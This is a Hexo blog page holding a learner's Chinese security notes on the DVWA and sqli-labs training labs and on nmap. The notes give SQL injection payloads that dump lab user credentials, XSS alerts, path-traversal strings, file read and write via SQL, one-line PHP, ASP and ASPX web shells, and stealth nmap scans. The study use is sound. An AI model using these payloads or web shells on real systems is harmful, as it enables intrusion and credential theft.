@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Regenbogenlj">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Regenbogenlj">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="记录一个小白的成长">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>&#39;dvwa笔记&#39; · RegenbogenLJ&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.jpg">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >RegenbogenLJ&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">'dvwa笔记'</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>RegenbogenLJ's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            'dvwa笔记'
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.6k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/12</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>1.常见用户名：root、admin、system、administrator<br><code>net user</code>查看用户<br><code>net localgroup administrators</code>查看管理员组<br><code>net user test 123 /add</code>增加用户<br>2.字典</p>
+<h2 id="命令行注入"><a href="#命令行注入" class="headerlink" title="命令行注入"></a>命令行注入</h2><p>A &amp;&amp; B 先执行A,后执行B<br>A | B 只执行B,不执行A</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>短链接</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>../../php.ini</code><br><code>../../phpinfo.php</code></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><code>1&#39; union select 1,database()#</code><br><code>1&#39; union select 1,database() where table_schema=dvwa#</code><br><code>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#</code><br><code>1&#39; union select 1,user,password from dvwa.users#</code><br><code>1&#39; union select 1,group_concat(password) from dvwa.users limit 1,1#</code></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>反射型<br><code>&lt;script&gt;alert(/crow/)&lt;/script&gt;</code><br>存储型<br><code>&lt;script&gt;alert(/crow/)&lt;/script&gt;</code><br>一刷新就会弹出</p>
+<h1 id="windows基础"><a href="#windows基础" class="headerlink" title="windows基础"></a>windows基础</h1><h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli_labs"></a>Sqli_labs</h1><h2 id="less-01"><a href="#less-01" class="headerlink" title="less-01"></a>less-01</h2><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>1.<code>http://192.168.1.37/sqli-labs/Less-1/?id=1&#39;</code>查看是否有注入，报错则有注入。<br>2.<code>http://192.168.1.37/sqli-labs/Less-1/?id=1&#39; order by 3 --+</code>查看有多少列<br>3.<code>http://192.168.1.37/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3--+</code>查看哪些数据可以回显<br>4.<code>http://192.168.1.37/sqli-labs/Less-1/?id=-1&#39; union select 1,2,database()--+</code>查看当前数据库<br>5.<code>http://192.168.1.37/sqli-labs/Less-1/?id=-1&#39; union select 1,2,schema_name from information_schema.schemata limit 4,1--+</code>查看数据库security<br><code>http://192.168.1.37/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code>查看所有数据库<br>6.<code>http://192.168.1.37/sqli-labs/Less-1/?id=-1&#39; union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1--+</code>查表</p>
+<p><code>http://192.168.1.37/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+</code>查看所有的表<br>7.<code>http://192.168.1.37/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</code>查看所有列<br>8.<code>http://192.168.1.37/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code>直接可以得到所有的账号和密码。并用~符号分割。</p>
+<h2 id="less-02"><a href="#less-02" class="headerlink" title="less-02"></a>less-02</h2><p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code><br><code>http://192.168.1.37/sqli-labs/Less-3/?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users
+--+</code></p>
+<h2 id="less-03"><a href="#less-03" class="headerlink" title="less-03"></a>less-03</h2><p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
+<p><code>http://192.168.1.37/sqli-labs/Less-3/?id=-1&#39;) union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users
+--+</code></p>
+<h2 id="less-04"><a href="#less-04" class="headerlink" title="less-04"></a>less-04</h2><p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code><br><code>http://192.168.1.37/sqli-labs/Less-4/?id=1&quot;)--+</code></p>
+<h2 id="less-05"><a href="#less-05" class="headerlink" title="less-05"></a>less-05</h2><p>盲注<br>id=1’ and left((select database()),1)=’s’ 用Bp爆破得到数据库名security<br>id=1’ and ascii(substr(select table_name from information_schema.tables where table_schema=0xsecurity limit 1,1),1,1)&gt;1–+二分法猜测得到security下的表名<br>id=1’ and ascii(substr(select username from security.users limit 1,1),1,1)&gt;1–+继续猜解即可得到字段内的值</p>
+<h2 id="mysql简单基本用法"><a href="#mysql简单基本用法" class="headerlink" title="mysql简单基本用法"></a>mysql简单基本用法</h2><p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。<br>information_schema数据库表说明:</p>
+<p>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</p>
+<p>TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</p>
+<p>COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</p>
+<p>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</p>
+<p>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</p>
+<p>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</p>
+<p>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</p>
+<p>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</p>
+<p>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</p>
+<p>COLLATIONS表：提供了关于各字符集的对照信息。</p>
+<p>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</p>
+<p>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</p>
+<p>KEY_COLUMN_USAGE表：描述了具有约束的键列。</p>
+<p>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</p>
+<p>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</p>
+<p>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表.<br>column_name：列的名称<br>information_schema.columns：表示所有列的信息（在整个mysql里面）<br>（information_schema：表示所有信息，包括库、表、列）<br>（information_schema.tables：表示所有表的信息）<br>table_schema：数据库的名称<br>table_name：表的名称<br><code>show databases</code><br><code>select schema_name from information_schema.schemata</code><br>查表<br><code>select table_name form information_schema.tables where table_schema=&#39;security&#39;</code><br>查列<br><code>select column_name from information_schema.columns where table_name=&#39;users&#39;</code><br>查字段<br><code>select usename,password from security.users</code><br>将同一字段组成一行打印出来<br><code>group_concat()</code><br>以<del>连接A和B两个字段<br>`concat_ws(‘</del>‘,A,B)<code>单引号里面的内容最好换成十六进制，不要单引号。
+显示系统用户</code>select system_user()<code></code>select user()<code></code>select current_user()<code>显示数据库</code>select database()<code>显示版本</code>select version()<code>显示安装目录</code>select @@datadir<code>显示安装路径</code>select @@basedir<code>显示操作系统</code>select @@version_compile_os`</p>
+<p><code>select *from users where id=&#39;1&#39; limit 0,1</code><br><code>limit 0,1</code> 其中第一位是从第几个开始，比如0代表从第一个开始，第二位的1表示显示多少个数据。<br><code>SELECT * FROM users WHERE id=&#39;1&#39; or 1=1--&#39; LIMIT 0,1</code><br>注释符号：<code>--+</code> <code>--</code> <code>#</code><br><code>id=1&#39; order by 3 --+</code>数据中存在三列<br>补充1：<br>1.left()函数：:left(databse(),1)=’s’ left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0<br>2.regexp函数：select user() regexp ‘r’   user()的结果是root,regexp为匹配root的正则表达式<br>3.like函数:select user() like ‘ro%’  匹配与regexp相似<br>4.substr(a,b,c) :select substr() XXX  substr(a,b,c)从b位置开始，截取a字符串c位长度<br><code>select substr((select database()),1,1)=&#39;s&#39;;</code><br>匹配第一个字符是否是s<br>5.ascii() ：将某个字符串转化为ascii值<br><code>select ascii(substr((select database),1,1));</code><br>6.chr(数字)或者ord(‘字母’) 使用Python中的两个函数可以判断当前的ascii值是多少<br>补充2：<br>1.show variables like ‘%secure%’<br>2.一句话木马：<br>php版本  <code>&lt;?php @eval($_POST[&#39;attack&#39;]) ?&gt;</code><br>asp的一句话是： <code>&lt;%eval request (&quot;pass&quot;)%&gt;</code><br>aspx的一句话是：  <code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code><br>3.load_file()读取本地文件<br><code>select load_file(&#39;c:\\phpstudy\\test.txt&#39;);</code> 注意使用双斜线<br>4.into outfile 写文件<br><code>select &#39;crow&#39; into outfile&#39;C:\\phpstudy\\test.txt&#39;</code></p>
+<h1 id="nmap的基本使用"><a href="#nmap的基本使用" class="headerlink" title="nmap的基本使用"></a>nmap的基本使用</h1><p><code>nmap [Scan Type(s)] [Options] {target specification}</code><br>1.用主机名和IP地址扫描系统<br><code>nmap server2.tecmint.com</code><br><code>nmap 192.168.0.101</code><br>2.扫描使用“-v”选项<br>使用“ -v “选项后给出了远程机器更详细的信息。<br><code>nmap -v server2.tecmint.com</code><br>3.扫描多台主机<br><code>nmap 192.168.0.101 192.168.0.102 192.168.0.103</code><br>4.扫描整个子网<br><code>nmap 192.168.0.*</code><br>5.使用IP地址的最后一个字节扫描多台服务器<br><code>nmap 192.168.0.101,102,103</code><br>6.从一个文件中扫描主机列表<br>运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址。<br><code>nmap -iL nmaptest.txt</code><br>7.扫描一个IP地址范围<br><code>nmap 192.168.0.101-110</code><br>8.排除一些远程主机后再扫描<br>使用“-exclude”选项来排除某些你不想要扫描的主机。<br><code>nmap 192.168.0.* --exclude 192.168.0.100</code><br>9.扫描操作系统信息和路由跟踪<br><code>nmap -A 192.168.0.101</code><br>10.启用Nmap的操作系统探测功能<br>使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息。<br><code>nmap -O server2.tecmint.com</code><br>11.扫描主机侦测防火墙<br>探测该主机是否使用了包过滤器或防火墙。<br><code>nmap -sA 192.168.0.101</code><br>12.扫描主机检测是否有防火墙保护<br>扫描主机检测其是否受到数据包过滤软件或防火墙的保护。<br><code>nmap -PN 192.168.0.101</code><br>13.找出网络中的在线主机<br>使用“-sP”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。<br><code>nmap -sP 192.168.0.*</code><br>14.执行快速扫描<br>使用“-F”选项执行一次快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口。<br><code>nmap -F 192.168.0.101</code><br>15.查看Nmap的版本<br><code>nmap -V</code><br>16.顺序扫描端口<br>使用“-r”选项表示不会随机的选择端口扫描。<br><code>nmap -r 192.168.0.101</code><br>17.打印主机接口和路由<br>使用nmap的“–iflist”选项检测主机接口和路由信息。<br><code>nmap --iflist</code><br>18.扫描特定的端口<br>使用“-P”选项指定你想要扫描的端口，默认情况下nmap只扫描TCP端口。<br><code>nmap -p 80 server2.tecmint.com</code><br>19.扫描TCP端口<br><code>nmap -p T:8888,80 server2.tecmint.com</code><br>20.扫描UDP端口<br><code>nmap -sU 53 server2.tecmint.com</code><br>21.扫描多个端口<br><code>nmap -p 80,443 192.168.0.101</code><br>22.扫描指定范围内的端口<br><code>nmap -p 80-160 192.168.0.101</code><br>23.查找主机服务版本号<br><code>nmap -sV 192.168.0.101</code><br>24.使用TCP ACK (PA)和TCP Syn (PS)扫描远程主机<br>有时候包过滤防火墙会阻断标准的ICMP ping请求，在这种情况下，我们可以使用TCP ACK和TCP Syn方法来扫描远程主机。<br><code>nmap -PS 192.168.0.101</code><br>25.使用TCP ACK扫描远程主机上特定的端口<br><code>nmap -PA -p 22,80 192.168.0.101</code><br>26.使用TCP Syn扫描远程主机上特定的端口<br><code>nmap -PS -p 22,80 192.168.0.101</code><br>27.执行一次隐蔽的扫描<br><code>nmap -sS 192.168.0.101</code><br>28.使用TCP Syn扫描最常用的端口<br><code>nmap -sT 192.168.0.101</code><br>29.执行TCP空扫描以骗过防火墙<br><code>nmap -sN 192.168.0.101</code></p>
+<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2>
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/03/14/Python笔记/" title= "Python笔记">
+                    <div class="nextTitle">Python笔记</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/11/“web安全笔记”/" title= "“web安全笔记”">
+                    <div class="prevTitle">“web安全笔记”</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1476869311@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Regenbogenlj" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force"><span class="toc-number">1.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令行注入"><span class="toc-number">2.</span> <span class="toc-text">命令行注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含"><span class="toc-number">4.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-number">5.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入"><span class="toc-number">6.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">7.</span> <span class="toc-text">XSS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows基础"><span class="toc-number"></span> <span class="toc-text">windows基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs"><span class="toc-number"></span> <span class="toc-text">Sqli_labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-01"><span class="toc-number">1.</span> <span class="toc-text">less-01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-02"><span class="toc-number">2.</span> <span class="toc-text">less-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-03"><span class="toc-number">3.</span> <span class="toc-text">less-03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-04"><span class="toc-number">4.</span> <span class="toc-text">less-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-05"><span class="toc-number">5.</span> <span class="toc-text">less-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql简单基本用法"><span class="toc-number">6.</span> <span class="toc-text">mysql简单基本用法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap的基本使用"><span class="toc-number"></span> <span class="toc-text">nmap的基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqlmap"><span class="toc-number">1.</span> <span class="toc-text">Sqlmap</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
